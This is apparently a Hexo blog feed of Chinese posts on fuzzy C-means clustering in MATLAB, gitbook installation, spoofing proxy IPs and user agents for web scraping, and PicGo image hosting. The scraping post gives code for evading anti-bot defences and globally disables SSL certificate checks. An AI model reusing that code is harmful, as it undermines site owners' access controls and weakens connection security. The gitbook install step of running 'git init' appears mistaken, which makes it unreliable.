mf = U.^expo;        obj_fcn(1)=sum(sum((dist.^2).*mf))+a*sum(sum((dist.^2).*((U-F).^expo)));   %在第k步循环中改变聚类中心ceneter,和分配函数U的隶属度值;   else       [U, center, obj_fcn(i)] = stepfcm(data, U, cluster_n, expo,a,F);   end   if display      fprintf('SFCM:Iteration count = %d, obj. fcn = %f\n', i, obj_fcn(i));   end% 终止条件判别   if i>1     if abs(obj_fcn(i) - obj_fcn(i-1)) < min_impro           break;     end   endend%iter_n = i; % 实际迭代次数%obj_fcn(iter_n+1:max_iter) = [];%[~,j]=find(U<0);%U(:,j)=[];%[V_pc,~,V_pe,V_xb] = V_pcpexb(U,data,center)endfunction [center,F] = initcenter(data_label,data,cluster_n)%默认为分3类center=zeros(cluster_n,size(data, 2));%可能要改F=zeros(cluster_n,size(data, 1));%可能要改for k=1:cluster_n for i=1:size(data_label,1)%center第一行，第一类   if data_label(i,1)==k       F(k,i)=1;       for j=2:size(data_label,2)-1          center(k,j)=(data_label(i,j)+center(k,j))/i;       end   end endend% for i=1:size(data_label,1)%center第2行，第2类%     if data_label(i,1)==2%         F(2,i)=1;%         for j=2:size(data_label,2)-1%            center(2,j)=(data_label(i,j)+center(2,j))/i;%         end%     end% end%    % for i=1:size(data_label,1)%center第3行，第3类%     if data_label(i,1)==3%         F(3,i)=1;%         for j=2:size(data_label,2)-1%            center(3,j)=(data_label(i,j)+center(3,j))/i;%         end%     end% endend% 子函数function U = initfcm(cluster_n,data,center0,F,a,expo)%a=6% 初始化fcm的隶属度函数矩阵% 输入:%   cluster_n   ---- 聚类中心个数%   data_n      ---- 样本点数% 输出：%   U           ---- 初始化的隶属度矩阵% U = rand(cluster_n, data_n);% col_sum = sum(U);                      % U = U./col_sum(ones(cluster_n, 1), :);%归一化dist = distfcm(center0, data); tmp = dist.^(-2/(expo-1)); %U= tmp./(ones(cluster_n, 1)*sum(tmp));U_fcm= tmp./(ones(cluster_n, 1)*sum(tmp));U_3 =(a/(1+a))* U_fcm.*(ones(cluster_n,1)*sum(F));U=U_fcm+(a/(1+a))*F-U_3;end% 子函数function [U_new, center, obj_fcn] = stepfcm(data,U,cluster_n, expo,a,F)% 模糊C均值聚类时迭代的一步% 输入：%   data        ---- nxm矩阵,表示n个样本,每个样本具有m的维特征值%   U           ---- 隶属度矩阵%   cluster_n   ---- 标量,表示聚合中心数目,即类别数%   expo        ---- 隶属度矩阵U的指数                     % 输出：%   U_new       ---- 迭代计算出的新的隶属度矩阵%   center      ---- 迭代计算出的新的聚类中心%   obj_fcn     ---- 目标函数值mf = U.^expo;       % 隶属度矩阵进行指数运算结果center = mf*data./((ones(size(data, 2), 1)*sum(mf'))'); % 新聚类中心(7)式     % 计算距离矩阵dist = distfcm(center, data);tmp = dist.^(-2/(expo-1));    U_fcm= tmp./(ones(cluster_n, 1)*sum(tmp));U_3 =(a/(1+a))* U_fcm.*((ones(cluster_n,1)*sum(F)));U_new=U_fcm+(a/(1+a))*F-U_3;obj_fcn =sum(sum((dist.^2).*mf))+a*sum(sum((dist.^2).*((U-F).^expo)));  % 计算目标函数值 (4)式end% 子函数function out = distfcm(center, data)% 计算样本点距离聚类中心的距离% 输入：%   center     ---- 聚类中心%   data       ---- 样本点% 输出：%   out        ---- 距离out = zeros(size(center, 1), size(data, 1)); for k = 1:size(center, 1) % 对每一个聚类中心   % 每一次循环求得所有样本点到一个聚类中心的距离   out(k, :) = sqrt(sum(((data-ones(size(data,1),1)*center(k,:)).^2)',1)); endend</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/weixin_42663919/article/details/89525967" target="_blank" rel="noopener">半监督模糊聚类算法FCM，SFCM，SSFCM理论和代码</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊聚类 </tag>
            
            <tag> 弱监督学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模糊C均值聚类(FCM)</title>
      <link href="2020/11/02/mo-hu-c-jun-zhi-ju-lei-fcm/"/>
      <url>2020/11/02/mo-hu-c-jun-zhi-ju-lei-fcm/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>模糊聚类又称为软聚类，相对于硬聚类这种非此即彼的分类，其用<strong>隶属度</strong>来表示每个样本属于每一类的程度。</p><p>模糊聚类中最为经典(古老)的是模糊C均值聚类（FCM），但在里哦了解FCM之前先了解一下kmeans吧。</p><h2 id="kmeans"><a href="#kmeans" class="headerlink" title="kmeans"></a>kmeans</h2><p>先来看看kmeans的具体过程,已有大佬写得很清晰明了了，我这里直接Ctrl CV$[1]$：</p><p> <img src="https://images2015.cnblogs.com/blog/1042406/201612/1042406-20161212135954464-1143551568.png" alt="kmeans迭代过程"> </p><p>上图a表达了初始的数据集，假设类簇数（分类数）k=2。在图b中，我们随机选择了两个k类所对应的类别质心，即图中的红色质心和蓝色质心，然后分别求样本中所有点到这两个质心的距离，并标记每个样本的类别为和该样本距离最小的质心的类别，如图c所示，经过计算样本和红色质心和蓝色质心的距离，我们得到了所有样本点的第一轮迭代后的类别。此时我们对我们当前标记为红色和蓝色的点分别求其新的质心，如图4所示，新的红色质心和蓝色质心的位置已经发生了变动。图e和图f重复了我们在图c和图d的过程，即将所有点的类别标记为距离最近的质心的类别并求新的质心。最终我们得到的两个类别如图f。</p><p>当然在实际K-Mean算法中，我们一般会多次运行图c和图d，才能达到最终的比较优的类别。这个循环多次执行图c和d的过程称之为“迭代”。</p><p>图和文字讲完了，现在来看看数学公式。</p><p>kmeans的思想是让每个聚类中心到属于该类的距离之和<strong>最小</strong>，故这样设置kmeans的目标函数：</p><script type="math/tex; mode=display">J = \sum_{i=1}^k \sum_{j=1}^n ||x_j-v_i||^2</script><p>因为想要让每个聚类中心到属于该类的距离之和<strong>最小</strong>，即让<strong>目标函数值最小</strong>。</p><p>其中$k$为类簇数，$n$为样本数；$x_j$表示第$ j $个样本( $j$的范围是 $[1,n]$ )，$v_i$表示第$i$个聚类中心（因为类簇数是$k$，所以$i$的范围是 $[1,k]$ ）</p><p>注意，在上式中$x_j$和$v_i$都是一个向量。这里以经典聚类数据集<strong>iris</strong> (150个样本，每个样本4个特征，所有样本分为3类) 为例子说明：</p><p><strong>iris前五个样本</strong>（每一行表示一个样本的数据，这里每个样本4个特征）</p><div class="table-container"><table><thead><tr><th>5.1</th><th>3.5</th><th>1.4</th><th>0.2</th></tr></thead><tbody><tr><td>4.9</td><td>3</td><td>1.4</td><td>0.2</td></tr><tr><td>4.7</td><td>3.2</td><td>1.3</td><td>0.2</td></tr><tr><td>4.6</td><td>3.1</td><td>1.5</td><td>0.2</td></tr><tr><td>5</td><td>3.6</td><td>1.4</td><td>0.2</td></tr></tbody></table></div><p>$x_1$表示第1个样本，例如iris数据集中$x_1= [5.1 , 3.5 , 1.4 ,0.2 ] $</p><p>$v_1$表第一个聚类中心（类簇中心），因为样本是四个特征，所有类簇中心也是4个特征，4个数值分别是第一类样本的各个特征的均值。</p><h2 id="FCM"><a href="#FCM" class="headerlink" title="FCM"></a>FCM</h2><p>在kmeans中，聚类中心$ v_i $确定之后就确定样本所属类别了，属于其他类别的程度为 <strong>0</strong>。在模糊聚类中，增加了一个<strong>隶属度</strong>来表示各个样本属于每一类的<strong>程度</strong>。</p><p>在模糊聚类中通常用$u_{ij}$来表示<strong>隶属度矩阵</strong>，其中$i={1,..c }$，$j= { 1,2,…n }$；$c$为类簇数，$n$为样本数。（跟上面介绍kmeans的符号是一样的）</p><p>模糊C均值聚类的目标函数：</p><script type="math/tex; mode=display">J(U,V) = \sum_{i=1}^c \sum_{j=1}^n u_{ij}^m ||x_j-v_i||^2</script><script type="math/tex; mode=display">s.t. \quad u_{ij} \in [0,1]; \sum_{i=1}^c u_{ij}=1</script><p>其中$c$是类簇数（C均值聚类嘛，所以相比kmeans把k换成了c）。$m$是加权指数幂，是一个自己给定的大于2的参数。</p><p>目标函数的约束条件是<strong>隶属度</strong>的范围是0~1，每个样本的隶属度之和为1。</p><p>上述目标函数只有$ u_{ij} $和$v_i $是未知，其他都为已知。</p><p>为了因为有等式约束条件，所以FCM中用拉格朗日乘数法引入拉格朗日因子让目标函数满足隶属度约束条件，具体方法不在这里讲解[2]。</p><p>得到隶属度矩阵迭代式：</p><script type="math/tex; mode=display">u_{ij} = \frac{1}{\sum_{k=1}^c \frac{||x_j-v_i||}{||x_j-v_k||}^ \frac{1}{m-1} }</script><p>聚类中心迭代式：</p><script type="math/tex; mode=display">v_i = \frac{\sum_{j=1}^n u_{ij}^m x_j }{ \sum_{j=1}^n{u_{ij}^m}}</script><ul><li><p><strong>随机初始聚类中心/隶属度矩阵:</strong>从上面的隶属度矩阵和聚类中心迭代式可看出，隶属度矩阵迭代式里的未知只有$v<em>i$，而聚类中心跌打式里不知道的只有$u</em>{ij}$。故迭代前先随机给定一个符合条件的隶属度矩阵或聚类中心矩阵，然后即可开始迭代。</p><p>如果初始化给定的是<strong>聚类中心矩阵</strong>，那么将聚类中心矩阵代入<strong>隶属度矩阵迭代式</strong>中计算得到新的隶属度矩阵；否则将初始化给定的<strong>隶属度矩阵</strong>代入<strong>聚类中心迭代式</strong>中计算。</p></li><li><p><strong>迭代</strong>：将聚类中心$v<em>i$（隶属度矩阵$u</em>{ij}$）代入隶属度矩阵迭代式（聚类中心迭代式）中计算得到新的隶属度矩阵$u<em>{ij}$（聚类中心矩阵$v</em>{i}$），再将新的隶属度矩阵$u_{ij}$和聚类中心$v_i$代入目标函数计算一次目标函数值，完成一次迭代。</p></li><li><p><strong>迭代停止:</strong>当两次迭代的目标函数值变化不大（至于多少才算是不大，这个由自己根据情况设定，在此称为<strong>阈值</strong>）或达到预先设定的最大迭代次数，即停止迭代。此时隶属度矩阵$U$和聚类中心矩阵$V$即为聚类结果。（$U=u_{ij},V=v_i$）</p></li></ul><p>没了，下次再写点半监督模糊聚类吧~</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>在matlab中调用自带的FCM</p><pre class=" language-lang-matlab"><code class="language-lang-matlab">[center,U] = fcm(data, cluster_n)    % data为样本数据(样本数=数组行数)，cluster_n为类簇数</code></pre><p>FCM的详细实现：</p><pre class=" language-lang-matlab"><code class="language-lang-matlab">function [U,center] = FCMclust(data, cluster_n)%% 随机初始隶属度FCM（这个比较符合算法实际情况）data_n = size(data, 1); % 求出data的第一维(rows)数,即样本个数 [center, U, obj_fcn]= FCMClust(data, cluster_n)in_n = size(data, 2);   % 求出data的第二维(columns)数，即特征值长度% 默认操作参数options = [2; % 隶属度矩阵U的指数    100;                % 最大迭代次数    1e-5;               % 隶属度最小变化量,迭代终止条件    1];                 % 每次迭代是否输出信息标志%将options 中的分量分别赋值给四个变量;expo = options(1);          % 隶属度矩阵U的指数max_iter = options(2);  % 最大迭代次数min_impro = options(3);  % 隶属度最小变化量,迭代终止条件display = options(4);  % 每次迭代是否输出信息标志obj_fcn = zeros(max_iter, 1); % 初始化输出参数obj_fcn% U = initfcm(cluster_n, data_n);     % 初始化模糊分配矩阵,使U满足列上相加为1,cluster_n=2,用户填上去的种类数c=cluster_ntemp=randperm(size(data,1));center = data(temp(1:cluster_n),:);dist = distfcm(center, data).^2;tmp = dist.^(-2/(expo-1));    U = tmp./(ones(cluster_n, 1)*sum(tmp));  %根据随机选取的样本作为初始聚类中心得到的初始隶属度矩阵[a,b] = find(isnan(U));U(a,b) = 0;% U = rand(cluster_n,size(data,1)).*100;% U = U./sum(U);% Main loop  主要循环for i = 1:max_iter    %在第k步循环中改变聚类中心ceneter,和分配函数U的隶属度值;    [U, center, obj_fcn(i)] = stepfcm(data, U, cluster_n, expo);    if display       fprintf('FCMclust:Iteration count = %d, obj. fcn = %f\n', i, obj_fcn(i));    end % 终止条件判别    if i>1      if abs(obj_fcn(i) - obj_fcn(i-1)) < min_impro            break;      end    endenditer_n = i; % 实际迭代次数%obj_fcn(iter_n+1:max_iter) = [];%% 评价指标%[V_pc,~,V_pe,V_xb] = V_pcpexb(U,data,center)end%% 子函数function U = initfcm(cluster_n, data_n)% 初始化fcm的隶属度函数矩阵% 输入:%   cluster_n   ---- 聚类中心个数%   data_n      ---- 样本点数% 输出：%   U           ---- 初始化的隶属度矩阵U = rand(cluster_n, data_n);col_sum = sum(U);U = U./col_sum(ones(cluster_n, 1), :);%归一化end%% 子函数function [U_new, center, obj_fcn] = stepfcm(data, U, cluster_n, expo)% 模糊C均值聚类时迭代的一步% 输入：%   data        ---- nxm矩阵,表示n个样本,每个样本具有m的维特征值%   U           ---- 隶属度矩阵%   cluster_n   ---- 标量,表示聚合中心数目,即类别数%   expo        ---- 隶属度矩阵U的指数                     % 输出：%   U_new       ---- 迭代计算出的新的隶属度矩阵%   center      ---- 迭代计算出的新的聚类中心%   obj_fcn     ---- 目标函数值mf = U.^expo;       % 隶属度矩阵进行指数运算结果center = mf*data./((ones(size(data, 2), 1)*sum(mf'))'); % 新聚类中心(5.4)式dist = distfcm(center, data);       % 计算距离矩阵obj_fcn = sum(sum((dist.^2).*mf));  % 计算目标函数值 (5.1)式tmp = dist.^(-2/(expo-1));    U_new = tmp./(ones(cluster_n, 1)*sum(tmp));  % 计算新的隶属度矩阵 (5.3)式end%% 子函数function out = distfcm(center, data)% 计算样本点距离聚类中心的距离% 输入：%   center     ---- 聚类中心%   data       ---- 样本点% 输出：%   out        ---- 距离out = zeros(size(center, 1), size(data, 1));  for k = 1:size(center, 1) % 对每一个聚类中心    % 每一次循环求得所有样本点到一个聚类中心的距离    out(k, :) = sqrt(sum(((data-ones(size(data,1),1)*center(k,:)).^2)',1));  endend</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/weixin_42029738/article/details/81978038" target="_blank" rel="noopener">K-means原理、优化及应用</a></p><p>[2] <a href="https://www.cnblogs.com/wxl845235800/p/11053261.html" target="_blank" rel="noopener">模糊C均值聚类的公式推导</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊聚类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitbook安装—_install卡住解决</title>
      <link href="2020/07/21/gitbook-an-zhuang-install-qia-zhu-jie-jue/"/>
      <url>2020/07/21/gitbook-an-zhuang-install-qia-zhu-jie-jue/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>可能有些人会好奇我明明已经搭建hexo博客了，为什么嗨哟啊用gitbook。</p><p>首先，hexo对latex的支持不说很好，这对我这种要常写数学公式的人来说很蓝瘦；</p><p>其次，hexo搭建的是博客，而如果想要放一本电子书，我觉得gitbook相比hexo更合适。</p><p>来看看gitbook的效果<a href="http://gitbook.hushuang.me/setup.html" target="_blank" rel="noopener">http://gitbook.hushuang.me/setup.html</a></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h4 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h4><p>直接<a href="https://blog.csdn.net/sanxd/article/details/82624127" target="_blank" rel="noopener">下载安装</a>，记得<code>我的电脑-属性-高级系统设置-环境变量-系统/我的环境变量</code>里添加Git的安装路径（就是告诉自己的电脑Git在哪，这样就任何一个文件夹位置都能使用Git了）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621220319488.png" alt="image-20200621220319488"></p><p>例如Git安装在<code>D:\Git\git-2.22.0\</code>这个位置</p><p>则环境变量里添加：</p><p><code>D:\Git\git-2.22.0\usr\bin\</code></p><p><code>D:\Git\git-2.22.0\usr\bin\ssh-keygen.exe</code></p><h4 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h4><p>建议新手在<a href="http://nodejs.cn/download/" target="_blank" rel="noopener">官网下载</a>安装最新的稳定版本，同样也得在环境变量里添加，比如安装在<code>D:\nodejs</code>就添加<code>D:\nodejs</code></p><h2 id="安装gitbook"><a href="#安装gitbook" class="headerlink" title="安装gitbook"></a>安装gitbook</h2><h3 id="配置镜像"><a href="#配置镜像" class="headerlink" title="配置镜像"></a>配置镜像</h3><p>首先打开git bash安装淘宝镜像（因为用官方源安装太慢了）</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i -g cnpm --registry=https://registry.npm.taobao.org</code></pre><p>检查一下用的是不是淘宝镜像</p><pre><code>npm config get registry</code></pre><p>安装之后使用命令时npm就该改<code>cnpm</code>了</p><h3 id="安装gitbook-cli"><a href="#安装gitbook-cli" class="headerlink" title="安装gitbook-cli"></a>安装gitbook-cli</h3><p>这里有个坑，要用管理员权限才能安装，linux开启<strong>管理员</strong>权限简单。</p><p>windows用户需要<kbd>鼠标右键</kbd>-<kbd>以管理员身份运行</kbd>打开命令提示符</p><p><img src="https://gitee.com/gdut_deepcode/ImageServer/raw/master/master/img/image-20200721061710237.png" alt=""></p><p>然后cd 到需要放电子书的目录，比如书的文档放在D:\Book，windows用户输入：</p><pre><code>cd/d D:\Book</code></pre><p>然后</p><pre><code>cnpm install gitbook-cli -g</code></pre><p>等待安装完</p><h3 id="安装gitbook-1"><a href="#安装gitbook-1" class="headerlink" title="安装gitbook"></a>安装gitbook</h3><p>还是在放电子书的目录，输入</p><pre><code>git init</code></pre><p>然后，会显示gitbook installing并一直在转圈圈，没错，跟卡住了一样，但实际上是在安装的。只要你能在任意一个文件目录使用<code>cnpm</code>就会安装（只要全局配置了淘宝镜像就会安装，虽然看起来真的跟卡住了一样）</p><p>这里会等待很久（可能是半个小时吧，看网络情况）</p><p>安装完了之后就看看怎么用吧</p><p><a href="http://gitbook.hushuang.me/setup.html" target="_blank" rel="noopener">http://gitbook.hushuang.me/setup.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python伪装ip以及浏览器型号</title>
      <link href="2020/07/13/python-wei-zhuang-ip-yi-ji-liu-lan-qi-xing-hao/"/>
      <url>2020/07/13/python-wei-zhuang-ip-yi-ji-liu-lan-qi-xing-hao/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>爬虫通常需要伪装ip和浏览器，因为较大的数据网站都会做一些反爬虫防护，伪装ip和浏览器型号是<code>模拟登录</code>的基础。</p><h2 id="获取代理ip"><a href="#获取代理ip" class="headerlink" title="获取代理ip"></a>获取代理ip</h2><p>芝麻http等可以拿到一些免费的代码ip，但说实话我不喜欢这样的（量太少）,下面用一个脚本来判断ip是否能ping 通。</p><p>这里先随机生成ip地址放在<code>ip_original.txt</code>这个文件（每个ip地址独自一行），待判断的ip可以随机生成，也可以在某些网站获取，例如：<a href="http://www.shenjidaili.com/shareip/" target="_blank" rel="noopener">http://www.shenjidaili.com/shareip/</a></p><p>把这些复制到的处理一下，去除<code>端口号</code>，只留ip地址，例如125.108.106.10存入txt文本中。</p><pre class=" language-lang-python"><code class="language-lang-python">#judge_ipimport osimport xlwt#读取txt文件里的ip地址存储为列表def ReadTxtName(rootdir):    lines = []    with open(rootdir, 'r') as file_to_read:        while True:            line = file_to_read.readline()            if not line:                break            line = line.strip('\n')            lines.append(line)    return lines#保存列表def text_save(filename, data):#filename为写入文件的路径，data为要写入数据列表.    file = open(filename,'a')    for i in range(len(data)):        s = str(data[i]).replace('[','').replace(']','')#去除[],这两行按数据不同，可以选择        s = s.replace("'",'').replace(',','') +'\n'   #去除单引号，逗号，每行末尾追加换行符        file.write(s)    file.close()    print("保存文件成功")ip_list=ReadTxtName('ip_original.txt')      #读取待判断是否有效的ip列表Effective_ip = [ ]  #创建存储有效ip的列表#判断ip是否可用for i in range(3,len(ip_list)):    result=os.system('ping '+ ip_list[i])   #0为可用ip，1为不可用ip    #print("结果是",result)    if result == 0:        Effective_ip.append( ip_list[i])    else:        print("第"+str(i+1)+"个ip无效")    text_save('ip_list.txt', Effective_ip)        #保存有效ip</code></pre><h2 id="伪装后打开网页"><a href="#伪装后打开网页" class="headerlink" title="伪装后打开网页"></a>伪装后打开网页</h2><pre class=" language-lang-python"><code class="language-lang-python">import urllib.requestimport requestsimport timeimport sslimport randomdef openUrl(ip, agent):    headers = {'User-Agent': agent}            #伪装浏览器型号    proxies = {'http' : ip}                    #伪装ip地址    requests.get("https://www.baidu.com/", headers=headers, proxies=proxies, verify=True)    ssl._create_default_https_context = ssl._create_unverified_context    print("Access to success.")#读取txt文件里的ip地址存储为列表def ReadTxtName(rootdir):    lines = []    with open(rootdir, 'r') as file_to_read:        while True:            line = file_to_read.readline()            if not line:                break            line = line.strip('\n')            lines.append(line)    return lines    #随机选取ipdef randomIP(ip_list):    ip = random.choice(ip_list)    return ip#随机选取浏览器型号def randomUserAgent():    UserAgent = random.choice([        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',        'Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)',        'Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0)',        'Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0)',        'Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11',        'Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1',        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER',        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36',        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36'    ])    return UserAgentif __name__ == '__main__':        ip_list = ReadTxtName('ip_list.txt')       #读入有效ip储存为列表        ip = randomIP(ip_list)                        #随机选择ip        agent = randomUserAgent()                    #随机选择浏览器型号        openUrl(ip, agent)                            #打开网页        time.sleep(10)</code></pre><p>戛然而止:stuck_out_tongue_closed_eyes:（因为剩下的要干什么我就不提供了，仅供学习或研究使用）</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图床</title>
      <link href="2020/07/06/da-jian-tu-chuang/"/>
      <url>2020/07/06/da-jian-tu-chuang/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要搭建图床？"><a href="#为什么要搭建图床？" class="headerlink" title="为什么要搭建图床？"></a>为什么要搭建图床？</h3><p>直接引用文件内的图片不好吗？少量图片的时候是是没问题，图片多了就麻烦了，而且像coding pages，带上一千多张图片是会部署失败的（其实就是文件数量太多了）。另外如果写博客在<code>博客园</code>、<code>掘金</code>等平台发布，总不能把图片也带上吧。这时候就需要搭建属于自己的图床了。</p><p>目前搭建图床的办法很多啦，像是七牛云、又拍云什么的（据说七牛云https流量收费，又拍云https流量免费但是好像有限制）。其实条件允许的话我是很推荐七牛云或腾讯云COS这些对象存储的，我就喜欢用代码托管平台的pages搭建图床，无它，就看上三点：<strong>免费</strong>、<strong>稳定</strong>、<strong>省得再去操心各个对象平台怎么用</strong></p><p>先来说一些老套的办法</p><h3 id="办法一：对象云存储"><a href="#办法一：对象云存储" class="headerlink" title="办法一：对象云存储"></a>办法一：对象云存储</h3><p>就是用七牛云、又拍云、腾讯云COS这些，要么氪金要么用着蓝瘦，二选一吧。</p><h3 id="办法二：GitHub-pages-jsDelivr-picgo"><a href="#办法二：GitHub-pages-jsDelivr-picgo" class="headerlink" title="办法二：GitHub pages + jsDelivr (+ picgo)"></a>办法二：GitHub pages + jsDelivr (+ picgo)</h3><p>github pages 直接设置里打开pages就行啦，至于 jsDelivr 也不是难用的东西，这个<strong>不用学</strong>。</p><p>jsDelivr是可以起到CDN加速，众所周知，国内访问github慢得一批，所以这里用一下cdn加速，可以让一些图片访问更快。</p><p>使用jsDelivr仅仅修改github pages 的链接即可</p><p>即 <a href="https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@发布的版本号/文件路径" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@发布的版本号/文件路径</a> </p><p>例如：</p><p> <a href="https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@1.0/images/trhx.png" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@1.0/images/trhx.png</a></p><p>不用发布也可以，其格式为：（直接去掉@版本号）</p><p><a href="https://cdn.jsdelivr.net/gh/你的github用户名/仓库名/md/sadasdd516516156.png" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/你的github用户名/仓库名/md/sadasdd516516156.png</a></p><p> 这个虽然是部署在github上，但是经过cdn加速之后显然访问速度还是很快的，有兴趣的同鞋自己琢磨吧，反正我用过之后是不想用了，为啥？访问速度是没问题了，<strong>可我上传图片呢?</strong>（我的网速慢，上传张图片网络良好等个十几秒甚至几十秒，若网络不顺畅就上传失败，这谁顶得住啊！）</p><p>所以我推荐用国内coding或者gitee搭建图床。</p><h3 id="办法三：-coding-gitee-picgo"><a href="#办法三：-coding-gitee-picgo" class="headerlink" title="办法三： coding/gitee +picgo"></a>办法三： coding/gitee +picgo</h3><p>下载个PicGo,安装</p><p>在插件设置里搜索<code>coding</code>或者<code>gitee</code>（搜索gitee会出现两个插件，下载哪个都行），安装插件需要本机安装了nodejs</p><p>安装之后左侧列表就会出现coding图床和gitee图床啦</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706230629.png" alt=""></p><p>在用之前先取一下token（就是这个仓库用来识别使用非git的第三方应用有没有权限提交文件到该仓库的东西），在右上角的<kbd>个人设置</kbd>-<kbd>访问令牌</kbd>里新建</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706232108.png" alt=""></p><p>按需勾选，我就直接勾选前三个了，必须要保证token可以读写仓库，创建令牌之后会有一串字符，这个就是token，注意这个<strong>只显示一次</strong>（刷新或者退出页面就没了）保存一下这个token</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706232249.png" alt=""></p><p>然后在picgo填上信息，分支那里如果是要把图片放在master分支根目录，就直接写<code>master</code>。例如我要放在master分支的md文件夹，那么我就填<code>master/md</code></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706232557.png" alt=""></p><p><strong>这里对于创建团队之后改过团队名的有个坑</strong>，团队名称要改成项目域名https后边的内容一样（即下面两个划红线的内容要一样）。因为picgo上传图片自动生成的链接是</p><p><code>https://团队现名.coding.net/p/项目名</code></p><p>但你的图片链接前面的部分是</p><p><code>https://团队初始名.coding.net/p/项目名</code></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/e95bed353a8ad8d01314ab242565634.png" alt=""></p><p>设置好了直接把图片<code>拖动</code>或者<code>剪贴板图片上传</code>就好啦，如果有问题检测一下设置。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708201434930.png" alt="image-20200708201434930"></p><p>上传成功之后直接<strong>粘贴</strong>就是图片链接了（windows点击打开picgo，是要在右侧点开<strong>显示隐藏图标</strong>,再<strong>鼠标右键</strong>-<strong>打开详细窗口</strong>才能打开上面的页面）</p><p>PicGo设置成这样也是有道理的，因为这样的话还是需要拖动文件到picgo，然后复制粘贴链接，但是用来markdown写作其实还有更简单的操作。</p><p>请先把Typora更新到0.98之后的版本</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708201926116.png" alt="Typora帮助-检查更新"></p><p>然后在Typora的<kbd>偏好设置</kbd>-<kbd>图像</kbd>设置成上传图片，填上PicGO路径</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708202057900.png" 